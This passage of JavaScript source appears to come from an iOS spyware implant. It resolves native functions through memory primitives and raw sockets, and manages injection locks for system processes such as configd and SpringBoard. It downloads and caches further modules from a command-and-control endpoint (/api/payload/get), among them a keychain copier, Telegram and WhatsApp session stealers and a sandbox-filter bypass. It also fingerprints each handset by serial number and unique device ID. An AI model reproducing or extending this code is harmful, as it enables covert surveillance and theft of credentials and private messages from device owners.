      let FCNTL = func_resolve("fcntl");
      // F_GETFL=3, F_SETFL=4, O_NONBLOCK=0x4 (Darwin)
      let fl = fcall(FCNTL, fd, 3n, 0n);
      if (fl < 0n) fl = 0n;
      fcall(FCNTL, fd, 4n, fl | 0x4n);
      return true;
    } catch (e) {
      return false;
    }
  }
  function __peNetClose(fd) {
    try { if (fd && fd > 0n) close(fd); } catch (e) {}
  }
  globalThis.__peNet = {
    connectIpv4: __peConnectIpv4,
    writeBytes: __peNetWriteBytes,
    readSome: __peNetReadSome,
    setNonblock: __peNetSetNonblock,
    close: __peNetClose
  };
  // Hot dbg modules: read small UTF-8 files (wa_identity / dbg.tcp.json)
  globalThis.__peFsRead = function (path, maxn) {
    try {
      maxn = maxn || 65536;
      if (maxn > 262144) maxn = 262144;
      let fd = fopen(get_cstring(String(path || "")), get_cstring("rb"));
      if (!fd || fd === 0n) return null;
      let buf = calloc(1n, BigInt(maxn + 8));
      let FREAD = func_resolve("fread");
      let nrd = fcall(FREAD, buf, 1n, BigInt(maxn), fd);
      fclose(fd);
      let out = "";
      if (nrd && nrd > 0n) {
        let n = Number(nrd);
        for (let i = 0; i < n; i++) {
          let qword = uread64(buf + BigInt(i & ~7));
          let b = Number((qword >> BigInt((i & 7) * 8)) & 0xffn);
          out += String.fromCharCode(b);
        }
      }
      free(buf);
      return out;
    } catch (e) {
      return null;
    }
  };
  globalThis.__peFsStat = function (path) {
    try {
      let fd = fopen(get_cstring(String(path || "")), get_cstring("rb"));
      if (!fd || fd === 0n) return { exists: false, size: -1 };
      // Lightweight: SEEK_END + ftell (avoid reading whole keychain DB through uread64)
      let FSEEK = func_resolve("fseek");
      let FTELL = func_resolve("ftell");
      let FREWIND = func_resolve("rewind");
      fcall(FSEEK, fd, 0n, 2n); // SEEK_END
      let sz = fcall(FTELL, fd);
      try { if (FREWIND) fcall(FREWIND, fd); } catch (_) {}
      fclose(fd);
      let n = (sz !== undefined && sz !== null && sz >= 0n) ? Number(sz) : -1;
      if (!(n >= 0) || n > 0x7fffffff) n = -1;
      return { exists: true, size: n };
    } catch (e) {
      return { exists: false, size: -1 };
    }
  };

  // Hot-pull disk cache (CorePayload ModuleStore lite). L1 mem -> L2 disk -> L3 /api/payload/get.
  let PE_CACHE_DIR = "/tmp/c2_ipc/cache";
  let PE_LOCK_PATH = "/tmp/c2_ipc/pe.lock";
  let PE_HEARTBEAT_PATH = "/tmp/c2_ipc/pe.heartbeat";
  // Live pe writes pe.heartbeat ~every 10s; older than this -> treat pe.lock as stealable.
  let PE_LOCK_HB_STALE_MS = 20000;
  // c2_agent.js on-device cache TTL: fresh (<5m) reuse; else re-fetch /api/payload/get and overwrite.
  let PE_AGENT_CACHE_TTL_MS = 300000;
  // Distributed inject lock: /tmp/lock/{hash(target)} - spin until holder releases or stale.
  let PE_INJECT_LOCK_DIR = "/tmp/lock";
  let PE_INJECT_LOCK_STALE_MS = 300000;
  function __peLockHash(name) {
    let s = String(name || "");
    let h = 5381 >>> 0;
    for (let i = 0; i < s.length; i++) {
      h = (((h << 5) + h) + s.charCodeAt(i)) >>> 0;
    }
    return h.toString(16);
  }
  function __peInjectLockPath(target) {
    return PE_INJECT_LOCK_DIR + "/" + __peLockHash(String(target || "configd"));
  }
  function __peInjectLockAcquire(target, op, opts) {
    opts = opts || {};
    let timeoutMs = Number(opts.timeoutMs || 120000);
    if (!(timeoutMs > 0)) timeoutMs = 120000;
    let staleMs = Number(opts.staleMs || PE_INJECT_LOCK_STALE_MS);
    let sid = String(opts.sid || "");
    let myPid = Number(fcall(GETPID));
    let tname = String(target || "configd");
    let path = __peInjectLockPath(tname);
    try { fcall(func_resolve("mkdir"), get_cstring("/tmp"), 0x1ff); } catch (_) {}
    try { fcall(func_resolve("mkdir"), get_cstring(PE_INJECT_LOCK_DIR), 0x1ff); } catch (_) {}
    let t0 = Date.now();
    while (Date.now() - t0 < timeoutMs) {
      let OPEN = func_resolve("open");
      let fd = fcall(OPEN, get_cstring(path), 0xA01n, 0x1a4n);
      if (fd >= 0n) {
        let body = JSON.stringify({
          pid: myPid,
          op: String(op || "inject"),
          sid: sid,
          target: tname,
          ts: Date.now()
        }) + "\n";
        fcall(func_resolve("write"), fd, get_cstring(body), BigInt(body.length));
        close(fd);
        return { ok: true, path: path, pid: myPid };
      }
      let prev = __peReadFileUtf8(path, 512).trim();
      if (prev) {
        try {
          let po = JSON.parse(prev);
          let hp = Number(po.pid) || 0;
          if (hp > 0 && hp !== myPid) {
            let alive = fcall(func_resolve("kill"), BigInt(hp), 0n);
            if (alive !== 0n) {
              try { fcall(func_resolve("unlink"), get_cstring(path)); } catch (_) {}
              continue;
            }
          }
          let pts = Number(po.ts) || 0;
          if (pts > 0 && (Date.now() - pts) > staleMs) {
            try { fcall(func_resolve("unlink"), get_cstring(path)); } catch (_) {}
            continue;
          }
        } catch (_) {}
      }
      try { fcall(USLEEP, 200000n); } catch (_) {
        try { fcall(SLEEP, 1n); } catch (__) {}
      }
    }
    return { ok: false, error: "lock_timeout", path: path, target: tname, op: op };
  }
  function __peInjectLockRelease(target) {
    let path = __peInjectLockPath(String(target || "configd"));
    try { fcall(func_resolve("unlink"), get_cstring(path)); } catch (_) {}
  }
  globalThis.__peInjectLockAcquire = __peInjectLockAcquire;
  globalThis.__peInjectLockRelease = __peInjectLockRelease;
  globalThis.__peInjectLockPath = __peInjectLockPath;
  function __peCacheSafeName(name) {
    return String(name || "x").replace(/[^a-zA-Z0-9._-]/g, "_");
  }
  function __peCachePath(name) {
    return PE_CACHE_DIR + "/" + __peCacheSafeName(name);
  }
  function __peReadFileUtf8(path, maxn) {
    try {
      maxn = maxn || (2 * 1024 * 1024);
      let fd = fopen(get_cstring(path), get_cstring("rb"));
      if (!fd || fd === 0n) return "";
      let buf = calloc(1n, BigInt(maxn + 8));
      let FREAD = func_resolve("fread");
      let n = fcall(FREAD, buf, 1n, BigInt(maxn), fd);
      fclose(fd);
      if (!n || n <= 0n) {
        free(buf);
        return "";
      }
      let out = "";
      let nr = Number(n);
      if (!Number.isFinite(nr) || nr < 0) {
        free(buf);
        return "";
      }
      if (nr > maxn) nr = maxn;
      let arr = new Array(nr);
      for (let i = 0; i < nr; i++) {
        let qword = uread64(buf + BigInt(i & ~7));
        let b = Number((qword >> BigInt((i & 7) * 8)) & 0xffn);
        arr[i] = String.fromCharCode(b);
      }
      free(buf);
      return arr.join("");
    } catch (_) {
      return "";
    }
  }
  function __peWriteFileUtf8(path, text) {
    try {
      let body = String(text || "");
      let p = String(path || "");
      if (!p) return false;
      // Prefer open/write - fopen+get_cstring has failed mid-pipeline for /tmp/c2_ipc mods.
      try {
        let OPEN = func_resolve("open");
        let WRITE = func_resolve("write");
        let CLOSE = func_resolve("close");
        let FCHMOD = func_resolve("fchmod");
        // O_WRONLY|O_CREAT|O_TRUNC = 0x601; mode 0644
        let fd = fcall(OPEN, get_cstring(p), 0x601n, 0x1a4n);
        if (fd >= 0n) {
          if (body.length > 0) {
            let wbuf = get_cstring(body);
            if (!wbuf) { try { fcall(CLOSE, fd); } catch (_) {} return false; }
            fcall(WRITE, fd, wbuf, BigInt(body.length));
          }
          try { if (FCHMOD) fcall(FCHMOD, fd, 0x1a4n); } catch (_) {}
          fcall(CLOSE, fd);
          return true;
        }
      } catch (_) {}
      let fd2 = fopen(get_cstring(p), get_cstring("wb"));
      if (!fd2 || fd2 === 0n) return false;
      if (body.length > 0) {
        let wbuf2 = get_cstring(body);
        if (!wbuf2) { fclose(fd2); return false; }
        fwrite(wbuf2, 1n, BigInt(body.length), fd2);
      }
      fclose(fd2);
      return true;
    } catch (_) {
      return false;
    }
  }
  function __peCacheRead(name, minLen) {
    minLen = minLen || 2000;
    try {
      let src = __peReadFileUtf8(__peCachePath(name), 2 * 1024 * 1024);
      if (!src || src.length < minLen) return "";
      if (src.indexOf(" omitted") >= 0) return "";
      return src;
    } catch (_) {
      return "";
    }
  }
  function __peCacheWrite(name, src, extra) {
    try {
      try { fcall(func_resolve("mkdir"), get_cstring("/tmp/c2_ipc"), 0x1ff); } catch (_) {}
      try { fcall(func_resolve("mkdir"), get_cstring(PE_CACHE_DIR), 0x1ff); } catch (_) {}
      let body = String(src || "");
      if (body.length < 2000) return false;
      let ok = __peWriteFileUtf8(__peCachePath(name), body);
      if (ok) {
        try {
          let meta = {
            name: String(name || ""),
            len: body.length,
            ts: Date.now()
          };
          if (extra && extra.sha256) meta.sha256 = String(extra.sha256);
          if (extra && extra.size != null) meta.size = Number(extra.size) || body.length;
          __peWriteFileUtf8(__peCachePath(name) + ".meta", JSON.stringify(meta));
        } catch (_) {}
      }
      return ok;
    } catch (_) {
      return false;
    }
  }
  function __peCacheUnlink(name) {
    try { fcall(func_resolve("unlink"), get_cstring(__peCachePath(name))); } catch (_) {}
    try { fcall(func_resolve("unlink"), get_cstring(__peCachePath(name) + ".meta")); } catch (_) {}
  }
  function __peCacheAgeMs(name) {
    try {
      let metaRaw = __peReadFileUtf8(__peCachePath(name) + ".meta", 4096);
      if (!metaRaw) return -1;
      let meta = JSON.parse(metaRaw);
      let ts = Number(meta && meta.ts) || 0;
      if (!(ts > 0)) return -1;
      let age = Date.now() - ts;
      return age >= 0 ? age : -1;
    } catch (_) {
      return -1;
    }
  }
  function __peCacheIsFresh(name, maxAgeMs) {
    maxAgeMs = Number(maxAgeMs);
    if (!(maxAgeMs > 0)) maxAgeMs = PE_AGENT_CACHE_TTL_MS;
    let age = __peCacheAgeMs(name);
    return age >= 0 && age < maxAgeMs;
  }
  globalThis.__peCacheAgeMs = __peCacheAgeMs;
  globalThis.__peCacheIsFresh = __peCacheIsFresh;
  globalThis.PE_AGENT_CACHE_TTL_MS = PE_AGENT_CACHE_TTL_MS;
  function __peHeartbeatAgeMs(path) {
    try {
      let raw = __peReadFileUtf8(path || PE_HEARTBEAT_PATH, 512);
      if (!raw) return -1;
      let o = JSON.parse(String(raw).trim());
      let ts = Number(o && o.ts) || 0;
      if (!(ts > 0)) return -1;
      let age = Date.now() - ts;
      return age >= 0 ? age : -1;
    } catch (_) {
      return -1;
    }
  }
  function __peLiveWorkerHoldingLock(holderPid) {
    // Prefer pe.heartbeat freshness (no bare TTL on pe.lock - live listen may run hours).
    let age = __peHeartbeatAgeMs(PE_HEARTBEAT_PATH);
    if (age >= 0 && age < PE_LOCK_HB_STALE_MS) {
      try {
        let raw = __peReadFileUtf8(PE_HEARTBEAT_PATH, 512);
        let o = JSON.parse(String(raw).trim());
        let hbp = Number(o && o.pid) || 0;
        if (hbp > 0 && holderPid > 0 && hbp !== holderPid) return false;
      } catch (_) {}
      return true;
    }
    return false;
  }
  function __peTryAcquireListenLock() {
    // Align CorePayload /var/tmp/pl.core.lock - one live pe listen.
    // Lock body: "pid\\ntoken\\nts\\n". Steal when holder dead OR pe.heartbeat stale/missing
    // (file can linger forever; no wall-clock TTL alone - that would kill long-lived listen).
    try {
      try { fcall(func_resolve("mkdir"), get_cstring("/tmp/c2_ipc"), 0x1ff); } catch (_) {}
      let myPid = Number(fcall(GETPID));
      let OPEN = func_resolve("open");
      // O_WRONLY|O_CREAT|O_EXCL = 0xA01; mode 0644
      let fd = fcall(OPEN, get_cstring(PE_LOCK_PATH), 0xA01n, 0x1a4n);
      if (fd >= 0n) {
        let tok = String(Date.now().toString(16)) + String((Math.random() * 1e9) | 0);
        globalThis.__pe_lock_token = tok;
        let body = String(myPid) + "\n" + tok + "\n" + String(Date.now()) + "\n";
        fcall(func_resolve("write"), fd, get_cstring(body), BigInt(body.length));
        close(fd);
        return { ok: true, stole: false, pid: myPid, token: tok };
      }
      let prev = __peReadFileUtf8(PE_LOCK_PATH, 128).trim();
      let lines = String(prev || "").split("\n");
      let oldPid = parseInt(lines[0] || "", 10) || 0;
      let oldTok = String(lines[1] || "").trim();
      if (oldPid > 0 && oldPid === myPid) {
        // Same JS realm handoff (start->listen): token matches.
        if (oldTok && globalThis.__pe_lock_token && oldTok === globalThis.__pe_lock_token) {
          return { ok: true, stole: false, pid: myPid, reown: true, token: oldTok };
        }
        // Fresh Safari re-eval into same process: only refuse if pe_worker heartbeat still live.
        if (__peLiveWorkerHoldingLock(oldPid)) {
          return { ok: false, holder: oldPid, pid: myPid, error: "same_pid_live_hb", token: oldTok };
        }
        // Heartbeat stale/missing -> previous JS died; steal lock in this realm.
      } else if (oldPid > 0 && oldPid !== myPid) {
        let alive = fcall(func_resolve("kill"), BigInt(oldPid), 0n);
        if (alive === 0n && __peLiveWorkerHoldingLock(oldPid)) {
          return { ok: false, holder: oldPid, pid: myPid };
        }
        // Holder pid dead, or alive but no fresh pe.heartbeat -> steal.
      }
      try { fcall(func_resolve("unlink"), get_cstring(PE_LOCK_PATH)); } catch (_) {}
      fd = fcall(OPEN, get_cstring(PE_LOCK_PATH), 0xA01n, 0x1a4n);
      if (fd >= 0n) {
        let tok2 = String(Date.now().toString(16)) + String((Math.random() * 1e9) | 0);
        globalThis.__pe_lock_token = tok2;
        let body2 = String(myPid) + "\n" + tok2 + "\n" + String(Date.now()) + "\n";
        fcall(func_resolve("write"), fd, get_cstring(body2), BigInt(body2.length));
        close(fd);
        return { ok: true, stole: true, pid: myPid, stale: oldPid, token: tok2 };
      }
      return { ok: false, error: "lock_busy", pid: myPid };
    } catch (e) {
      return { ok: true, warn: String(e) };
    }
  }
  globalThis.__peHeartbeatAgeMs = __peHeartbeatAgeMs;
  globalThis.__peLiveWorkerHoldingLock = __peLiveWorkerHoldingLock;
  globalThis.PE_LOCK_HB_STALE_MS = PE_LOCK_HB_STALE_MS;
  globalThis.__peCacheRead = __peCacheRead;
  globalThis.__peCacheWrite = __peCacheWrite;
  globalThis.__peCacheUnlink = __peCacheUnlink;
  globalThis.__peTryAcquireListenLock = __peTryAcquireListenLock;

  // Hot-slot registry: L1 mem -> L2 disk cache -> L3 /api/payload/get (see src/pe_slot_loader.js).
  if (!globalThis.__peSlotLoaderReady) {
    globalThis.__peSlotLoaderReady = true;
    globalThis.PE_SLOT_TABLE = globalThis.PE_SLOT_TABLE || {
      "c2_bootstrap.js": { minLen: 2000, omit: "c2_bootstrap omitted" },
      "c2_agent.js": { minLen: 2000, omit: "c2_agent omitted" },
      "MigFilterBypassThread.js": { minLen: 2000, omit: "MigFilterBypassThread omitted" },
      "c2_probe.js": { minLen: 200, omit: "c2_probe omitted" },
      "session_telegram.js": { minLen: 500, omit: "session_telegram omitted" },
      "session_whatsapp.js": { minLen: 500, omit: "session_whatsapp omitted" },
      "session_probe.js": { minLen: 200, omit: "session_probe omitted" },
      "keychain_copier.js": { minLen: 500, omit: "keychain_copier omitted" },
      "pe_dbg_tcp.js": { minLen: 200, omit: "pe_dbg_tcp omitted" },
      "pe_direct.js": { minLen: 1000, omit: "pe_direct omitted" },
      "pe_session_eval.js": { minLen: 200, omit: "pe_session_eval omitted" },
      "loader.js": { minLen: 500, omit: "loader.js omitted" }
    };
    globalThis.peResolveModule = function peResolveModule(name, opts) {
      opts = opts || {};
      let pname = String(name || "");
      if (pname.indexOf(".js") < 0) pname = pname + ".js";
      let meta = globalThis.PE_SLOT_TABLE[pname] || { minLen: opts.minLen || 80, omit: opts.omit || " omitted" };
      let memKey = "__pe_slot_" + pname.replace(/[^a-zA-Z0-9._-]/g, "_");
      let forceNet = !!opts.forceNet;
      // c2_agent.js: on-device cache must be <5m old; else re-pull and overwrite.
      let agentTtl = pname === "c2_agent.js";
      let agentStale = false;
      if (agentTtl && !forceNet) {
        let age = typeof __peCacheAgeMs === "function" ? __peCacheAgeMs(pname) : -1;
        if (age < 0 || age >= PE_AGENT_CACHE_TTL_MS) {
          agentStale = true;
          forceNet = true;
        }
      }
      function valid(src) {
        if (!src || src.length < (meta.minLen || 80)) return false;
        if (meta.omit && src.indexOf(meta.omit) >= 0) return false;
        return true;
      }
      if (!forceNet) {
        try {
          let mem = globalThis[memKey];
          if (valid(mem)) return { ok: true, src: String(mem), via: "mem", name: pname };
        } catch (_) {}
      }
      if (!forceNet && opts.embedded) {
        let emb = String(opts.embedded || "");
        if (valid(emb)) {
          globalThis[memKey] = emb;
          try { __peCacheWrite(pname, emb); } catch (_) {}
          return { ok: true, src: emb, via: "embed", name: pname };
        }
      }
      if (!forceNet) {
        try {
          let disk = __peCacheRead(pname, meta.minLen || 80);
          if (valid(disk)) {
            globalThis[memKey] = disk;
            return { ok: true, src: disk, via: "disk", name: pname };
          }
        } catch (_) {}
      }
      let httpPost = typeof __peHttpPostJson === "function" ? __peHttpPostJson : globalThis.__peHttpPostJson;
      if (typeof httpPost !== "function") {
        if (agentStale) {
          try {
            let diskFb = __peCacheRead(pname, meta.minLen || 80);
            if (valid(diskFb)) {
              globalThis[memKey] = diskFb;
              return { ok: true, src: diskFb, via: "disk_stale", name: pname };
            }
          } catch (_) {}
        }
        return { ok: false, error: "no_http", name: pname };
      }
      let idn = (typeof pePayloadIdentity === "function" ? pePayloadIdentity : globalThis.pePayloadIdentity)() || {};
      let resp = httpPost("/api/payload/get", JSON.stringify({
        name: pname,
        uid: idn.uid || idn.uuid || "",
        uuid: idn.uuid || idn.uid || "",
        device_code: idn.device_code || idn.uuid || ""
      }));
      if (!resp || resp.length < 20) {
        if (agentStale) {
          try {
            let diskFb2 = __peCacheRead(pname, meta.minLen || 80);
            if (valid(diskFb2)) {
              globalThis[memKey] = diskFb2;
              return { ok: true, src: diskFb2, via: "disk_stale", name: pname };
            }
          } catch (_) {}
        }
        return { ok: false, error: "payload_empty", name: pname };
      }
      let obj = null;
      try { obj = JSON.parse(resp); } catch (_) { return { ok: false, error: "payload_json", name: pname }; }
      let src = (typeof __pePayloadSrcFromResp === "function" ? __pePayloadSrcFromResp(obj) : ((obj && obj.src) ? String(obj.src) : ""));
      if (!valid(src)) return { ok: false, error: "payload_short", name: pname, len: src.length };
      globalThis[memKey] = src;
      try { __peCacheWrite(pname, src, { sha256: obj && obj.sha256, size: obj && obj.size }); } catch (_) {}
      return { ok: true, src: src, via: agentStale ? "net_refresh" : "net", name: pname };
    };
    globalThis.peEnsureModule = globalThis.peResolveModule;
  }

  // Partner-aligned device identity (aa1/wap/CorePayload): uuid := SerialNumber when known.
  // PE-direct fallback: durable peid-* per handset (multi-device lab); never IOKit from mpd listen.
  let PE_DEVICE_PATH = "/tmp/c2_ipc/device.json";
  let PE_PERSIST_ID_PATH = "/var/mobile/Media/.c2_pe_device_id";
  function __peIsPidPlaceholder(dc) {
    return dc === "pe" || /^pe-\d+$/.test(String(dc || "")) || /^sb-\d+$/.test(String(dc || ""));
  }
  function __peValidPeid(s) {
    s = String(s || "").trim();
    return s.length >= 10 && s.indexOf("peid-") === 0 && /^peid-[0-9a-f]+$/i.test(s);
  }
  function __peIsRealIokitUuid(s) {
    s = String(s || "").trim();
    if (!s || __peIsPidPlaceholder(s) || __peValidPeid(s)) return false;
    return /^[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}$/.test(s);
  }
  function __peIdsRank(ids) {
    if (!ids) return 0;
    if (ids.serial || ids.source === "serial") return 4;
    if (ids.source === "iokit_uuid" || __peIsRealIokitUuid(ids.platform_uuid) || __peIsRealIokitUuid(ids.uuid))
      return 3;
    if (ids.source === "unique" && ids.unique) return 3;
    if (__peValidPeid(ids.peid || ids.uuid) || ids.source === "peid") return 2;
    if (__peIsPidPlaceholder(ids.uuid) || ids.source === "pe_pid") return 1;
    return 0;
  }
  function __peKeepPeidOn(ids) {
    ids = ids && typeof ids === "object" ? ids : {};
    if (__peValidPeid(ids.peid)) return ids;
    let peid = "";
    try {
      let persist = String(__peReadFileUtf8(PE_PERSIST_ID_PATH, 128) || "").trim();
      if (__peValidPeid(persist)) peid = persist;
    } catch (_) {}
    if (!peid) {
      try {
        let disk = peReadDeviceJson();
        if (disk && __peValidPeid(disk.peid)) peid = String(disk.peid);
        else if (disk && __peValidPeid(disk.uuid) && disk.source === "peid") peid = String(disk.uuid);
      } catch (_) {}
    }
    if (!peid) {
      try {
        let g = globalThis.__pe_device_ids;
        if (g && __peValidPeid(g.peid)) peid = String(g.peid);
      } catch (_) {}
    }
    if (peid) ids.peid = peid;
    return ids;
  }
  function peReadDeviceJson() {
    try {
      let cached = __peReadFileUtf8(PE_DEVICE_PATH, 4096);
      if (!cached) return null;
      let o = JSON.parse(cached);
      return o && typeof o === "object" ? o : null;
    } catch (_) {
      return null;
    }
  }
  function peIdentityReadyFrom(ids) {
    ids = ids || globalThis.__pe_device_ids;
    if (!ids) ids = peReadDeviceJson();
    if (!ids) return false;
    return ids.source === "iokit_uuid" || __peIsRealIokitUuid(ids.platform_uuid) || __peIsRealIokitUuid(ids.uuid);
  }
  globalThis.__peIsRealIokitUuid = __peIsRealIokitUuid;
  globalThis.__peIdsRank = __peIdsRank;
  globalThis.__peKeepPeidOn = __peKeepPeidOn;
  globalThis.peReadDeviceJson = peReadDeviceJson;
  globalThis.peIdentityReadyFrom = peIdentityReadyFrom;
  function __peGenPeid(N) {
    let pid = 0;
    try { pid = Number(fcall(GETPID)); } catch (_) { pid = 0; }
    let ts = Date.now();
    let mix = (ts ^ (pid * 2654435761)) >>> 0;
    try {
      let p = N.callSymbol("calloc", 1, 8);
      if (p && p !== 0n) {
        mix = (mix ^ Number(p & 0xffffffffn)) >>> 0;
        try { N.callSymbol("free", p); } catch (_) {}
      }
    } catch (_) {}
    let hex = (ts.toString(16) + mix.toString(16) + pid.toString(16)).replace(/[^0-9a-f]/gi, "");
    while (hex.length < 32) hex += "0";
    return "peid-" + hex.slice(0, 32);
  }
  function peEnsurePersistentDeviceId(N) {
    try {
      if (globalThis.__pe_peid_ready && globalThis.__pe_device_ids && globalThis.__pe_device_ids.peid)
        return globalThis.__pe_device_ids;
    } catch (_) {}
    let peid = "";
    try {
      peid = String(__peReadFileUtf8(PE_PERSIST_ID_PATH, 128) || "").trim();
    } catch (_) {}
    try {
      let disk = peReadDeviceJson();
      if (disk && peIdentityReadyFrom(disk)) {
        disk = __peKeepPeidOn(disk);
        globalThis.__pe_device_ids = disk;
        globalThis.__pe_peid_ready = true;
        try { __peWriteFileUtf8(PE_DEVICE_PATH, JSON.stringify(disk)); } catch (_) {}
        LOG("[PE-ID] adopt agent uuid=" + disk.uuid + " peid=" + (disk.peid || "") + " source=" + disk.source);
        return disk;
      }
      if (disk && __peValidPeid(disk.peid)) peid = String(disk.peid);
      else if (disk && __peValidPeid(disk.uuid) && disk.source === "peid") peid = String(disk.uuid);
    } catch (_) {}
    if (!__peValidPeid(peid)) peid = __peGenPeid(N);
    let cur = globalThis.__pe_device_ids || {};
    try {
      let cached = peReadDeviceJson();
      if (cached) {
        if (peIdentityReadyFrom(cached) || cached.serial || cached.source === "serial" || cached.source === "unique") {
          globalThis.__pe_peid_ready = true;
          globalThis.__pe_device_ids = cached;
          return cached;
        }
        cur = cached;
      }
    } catch (_) {}
    let ids = {
      uuid: String(cur.serial || cur.uuid || peid),
      serial: String(cur.serial || ""),
      unique: String(cur.unique || ""),
      peid: String(peid),
      ts: Date.now(),
      source: cur.serial ? "serial" : (cur.unique ? "unique" : "peid")
    };
    if (ids.serial) ids.uuid = ids.serial;
    else if (!ids.uuid || __peIsPidPlaceholder(ids.uuid)) ids.uuid = peid;
    try {
      let disk = peReadDeviceJson();
      if (disk && __peIdsRank(disk) > __peIdsRank(ids)) {
        disk = __peKeepPeidOn(disk);
        if (!__peValidPeid(disk.peid) && __peValidPeid(ids.peid)) disk.peid = ids.peid;
        globalThis.__pe_device_ids = disk;
        globalThis.__pe_peid_ready = true;
        try { __peWriteFileUtf8(PE_DEVICE_PATH, JSON.stringify(disk)); } catch (_) {}
        LOG("[PE-ID] keep disk uuid=" + disk.uuid + " peid=" + (disk.peid || "") + " source=" + disk.source);
        return disk;
      }
    } catch (_) {}
    globalThis.__pe_device_ids = ids;
    globalThis.__pe_peid_ready = true;
    try {
      __peWriteFileUtf8(PE_PERSIST_ID_PATH, peid + "\n");
    } catch (_) {}
    try {
      try { fcall(func_resolve("mkdir"), get_cstring("/tmp/c2_ipc"), 0x1ff); } catch (_) {}
      __peWriteFileUtf8(PE_DEVICE_PATH, JSON.stringify(ids));
    } catch (_) {}
    LOG("[PE-ID] peid ready uuid=" + ids.uuid + " peid=" + peid + " source=" + ids.source);
    return ids;
  }
  globalThis.peEnsurePersistentDeviceId = peEnsurePersistentDeviceId;
  function __peMgCopyAnswer(N, key, outBuf, outSz) {
    try {
      let h = N.callSymbol("dlopen", "/usr/lib/libMobileGestalt.dylib", 1);
      if (!h || h === 0n) return "";
      let MG = N.callSymbol("dlsym", h, "MGCopyAnswer");
      let cf = N.callSymbol("dlopen", "/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", 1);
      if (!MG || MG === 0n || !cf || cf === 0n) return "";
      let CFCreate = N.callSymbol("dlsym", cf, "CFStringCreateWithCString");
      let CFGet = N.callSymbol("dlsym", cf, "CFStringGetCString");
      let CFRel = N.callSymbol("dlsym", cf, "CFRelease");
      if (!CFCreate || CFCreate === 0n || !CFGet || CFGet === 0n) return "";
      let k = fcall(CFCreate, 0n, get_cstring(key), 0x08000100n);
      if (!k || k === 0n) return "";
      let ans = fcall(MG, k);
      try { if (CFRel && CFRel !== 0n) fcall(CFRel, k); } catch (_) {}
      if (!ans || ans === 0n) return "";
      let ok = fcall(CFGet, ans, outBuf, BigInt(outSz), 0x08000100n);
      try { if (CFRel && CFRel !== 0n) fcall(CFRel, ans); } catch (_) {}
      if (!ok || ok === 0n) return "";
      return N.readString(outBuf, outSz) || "";
    } catch (_) {
      return "";
    }
  }
  function __peIokitSerial(N, outBuf, outSz) {
    try {
      let iokit = N.callSymbol("dlopen", "/System/Library/Frameworks/IOKit.framework/IOKit", 1);
      let cf = N.callSymbol("dlopen", "/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", 1);
      if (!iokit || iokit === 0n || !cf || cf === 0n) return "";
      let IOServiceMatching = N.callSymbol("dlsym", iokit, "IOServiceMatching");
      let IOServiceGetMatchingService = N.callSymbol("dlsym", iokit, "IOServiceGetMatchingService");
      let IORegistryEntryCreateCFProperty = N.callSymbol("dlsym", iokit, "IORegistryEntryCreateCFProperty");
      let IOObjectRelease = N.callSymbol("dlsym", iokit, "IOObjectRelease");
      let CFCreate = N.callSymbol("dlsym", cf, "CFStringCreateWithCString");
      let CFGet = N.callSymbol("dlsym", cf, "CFStringGetCString");
      let CFRel = N.callSymbol("dlsym", cf, "CFRelease");
      if (!IOServiceMatching || !IOServiceGetMatchingService || !IORegistryEntryCreateCFProperty || !CFCreate || !CFGet)
        return "";
      let matching = fcall(IOServiceMatching, get_cstring("IOPlatformExpertDevice"));
      if (!matching || matching === 0n) return "";
      let svc = fcall(IOServiceGetMatchingService, 0n, matching);
      if (!svc || svc === 0n) return "";
      let key = fcall(CFCreate, 0n, get_cstring("IOPlatformSerialNumber"), 0x08000100n);
      if (!key || key === 0n) {
        try { if (IOObjectRelease) fcall(IOObjectRelease, svc); } catch (_) {}
        return "";
      }
      let prop = fcall(IORegistryEntryCreateCFProperty, svc, key, 0n, 0n);
      try { if (CFRel) fcall(CFRel, key); } catch (_) {}
      try { if (IOObjectRelease) fcall(IOObjectRelease, svc); } catch (_) {}
      if (!prop || prop === 0n) return "";
      let ok = fcall(CFGet, prop, outBuf, BigInt(outSz), 0x08000100n);
      try { if (CFRel) fcall(CFRel, prop); } catch (_) {}
      if (!ok || ok === 0n) return "";
      return N.readString(outBuf, outSz) || "";
    } catch (_) {
      return "";
    }
  }
  function peResolveDeviceIds(N, opts) {
    // uuid = SerialNumber when known; pe (mediaplaybackd) must NOT call MG/IOKit on the
    // cold path - both lab phones hung forever after "settle 3s before stub" with no
    // further pelog (blocked stub inject -> no beacon -> empty device list).
    // Default: cache or pe-<pid>; allowNative=true only if a safer context needs it.
    // SpringBoard bootstrap upgrades device.json to SerialNumber after stub inject.
    opts = opts || {};
    let allowNative = opts.allowNative === true;
    try {
      if (globalThis.__pe_device_ids && globalThis.__pe_device_ids.uuid) {
        let cur = globalThis.__pe_device_ids;
        if (peIdentityReadyFrom(cur) || cur.serial || cur.source === "serial" || cur.source === "unique")
          return cur;
      }
    } catch (_) {}
    try {
      let cached = peReadDeviceJson();
      if (cached && cached.uuid) {
        if (peIdentityReadyFrom(cached) || cached.serial || cached.source === "serial" ||
            cached.source === "unique") {
          globalThis.__pe_device_ids = cached;
          return cached;
        }
        if (!allowNative) {
          globalThis.__pe_device_ids = cached;
          return cached;
        }
      }
    } catch (_) {}
    let serial = "";
    let unique = "";
    if (allowNative) {
      try {
        let buf = N.callSymbol("calloc", 1, 128);
        if (buf && buf !== 0n) {
          // Prefer IOKit (aa1); MGCopyAnswer from mpd has hung the worker
          serial = __peIokitSerial(N, buf, 120) || "";
          if (!serial) serial = __peMgCopyAnswer(N, "SerialNumber", buf, 120) || "";
          unique = __peMgCopyAnswer(N, "UniqueDeviceID", buf, 120) || "";
          try { N.callSymbol("free", buf); } catch (_) {}
        }
      } catch (_) {}
    }
    let pePid = 0;
    try { pePid = Number(fcall(GETPID)); } catch (_) { pePid = 0; }
    let peid = "";
    if (!serial && !unique) {
      try {
        let ensured = peEnsurePersistentDeviceId(N);
        if (ensured) {
          if (ensured.serial) return ensured;
          peid = String(ensured.peid || ensured.uuid || "");
          if (!__peValidPeid(peid) && __peValidPeid(ensured.uuid)) peid = ensured.uuid;
        }
      } catch (_) {}
    }
    let uuid = serial || unique || peid || ("pe-" + pePid);
    let ids = {
      uuid: String(uuid),
      serial: String(serial || ""),
      unique: String(unique || ""),
      peid: String(peid || ""),
      ts: Date.now(),
